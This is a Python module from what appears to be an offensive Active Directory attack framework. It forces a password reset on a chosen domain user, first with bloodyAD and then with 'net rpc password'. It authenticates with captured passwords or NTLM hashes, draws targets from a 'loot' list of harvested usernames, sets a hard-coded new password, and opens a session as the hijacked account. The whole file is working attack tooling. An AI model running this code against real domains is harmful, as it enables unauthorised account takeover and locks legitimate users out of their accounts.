# modules/forcechangepw.py

from core.helpers import get_auth_args, run_command, select_from_list
from core.colors import red, green, yellow, blue
import os

DEFAULT_NEW_PASSWORD = "BaldHead2025!"

def attack_force_change(session, *parts, session_mgr=None):
    print(blue(f"[*] Attempting to change password using BloodyAD on {session.target_ip}..."))
    target_user = parts[0] if parts else None

    if not target_user:
        choice = input("[?] Load usernames from loot/valid_users.txt? (Y/n): ").strip().lower()
        if choice in ["", "y", "yes"]:
            loot_path = "loot/valid_users.txt"
            if os.path.exists(loot_path):
                with open(loot_path, "r") as f:
                    users = [line.strip() for line in f if line.strip()]
                if users:
                    target_user = select_from_list(users, "Select user to change password")
                else:
                    print(yellow("[!] No users found in the file."))
                    target_user = input("[?] Enter username manually: ").strip()
            else:
                print(yellow("[-] loot/valid_users.txt not found."))
                target_user = input("[?] Enter username manually: ").strip()
        else:
            target_user = input("[?] Enter username manually: ").strip()


    is_kerberos = not session.hash and not session.password
    is_self_change = session.username.lower() == target_user.lower()

    # === Build BloodyAD command ===
    if session.hash:
        auth = f"-u '{session.username}' -p :{session.hash}"
        bloody_cmd = (
            f"bloodyAD --host {session.target_ip} -d {session.domain} "
            f"{auth} --dc-ip {session.dc_ip} set password {target_user} '{DEFAULT_NEW_PASSWORD}'"
        )
    elif session.password:
        auth = f"-u '{session.username}' -p '{session.password}'"
        bloody_cmd = (
            f"bloodyAD --host {session.target_ip} -d {session.domain} "
            f"{auth} --dc-ip {session.dc_ip} set password {target_user} '{DEFAULT_NEW_PASSWORD}'"
        )

    # === Attempt password change with BloodyAD ===
    out, err = run_command(bloody_cmd)
    combined = (out + "\n" + err).lower()

    if any(x in combined for x in ["success", "password changed", "done"]):
        print(green(f"[+] Password changed successfully via BloodyAD:\n{out.strip()}"))
        _add_new_session(session_mgr, target_user, session)
        return

    if "password can't be changed" in combined:
        print(red("[!] BloodyAD failed: Password can't be changed."))
        print(yellow("[!] This usually means the old password is required or you lack permissions."))
    elif "access denied" in combined or "can't be changed" in combined:
        print(red("[!] BloodyAD failed to change password."))
        print(yellow("[!] Target user may be protected or you're lacking rights."))
    else:
        print(red("[!] BloodyAD failed to change password."))

    # === Special case: Kerberos cannot reset others without delegation ===
    if is_kerberos and not is_self_change:
        print(yellow("[!] Kerberos cannot reset another user's password without delegation rights."))
        print(yellow("[!] Try re-authenticating using a password or hash."))
        print(blue("[*] Recommended:"))
        print(blue(f"    session add {session.username}_pw {session.username} <password> {session.domain} {session.target_ip} {session.dc_ip}"))
        print(blue(f"    Then run: attack forcechangepw {target_user}"))
        return

    # === Fallback: net rpc ===
    if is_kerberos:
        print(yellow("[!] Skipping net rpc fallback (not supported with Kerberos-only auth)."))
        return

    print(blue("[*] Trying fallback with net rpc..."))

    rpc_auth = get_auth_args(session)
    rpc_cmd = (
        f"net rpc password \"{target_user}\" \"{DEFAULT_NEW_PASSWORD}\" "
        f"{rpc_auth} -S {session.dc_ip}"
    )

    out, err = run_command(rpc_cmd)
    combined = (out + "\n" + err).lower()

    if any(x in combined for x in ["was changed", "success", "done"]):
        print(green(f"[+] Password changed successfully via net rpc:\n{out.strip()}"))
        _add_new_session(session_mgr, target_user, session)
    else:
        print(red(f"[-] net rpc failed: {err if err else out}"))
        if "access denied" in combined:
            print(yellow("[!] You may lack rights to reset this password."))


def _add_new_session(session_mgr, target_user, old_session):
    if not session_mgr:
        return

    session_name = f"{target_user.lower()}_pwreset"
    session_mgr.add(
        name=session_name,
        username=target_user,
        secret=DEFAULT_NEW_PASSWORD,
        domain=old_session.domain,
        target_ips=old_session.target_ip,
        dc_ip=old_session.dc_ip
    )
    print(green(f"[+] New session added: '{session_name}' for user '{target_user}' with password: {DEFAULT_NEW_PASSWORD}'"))
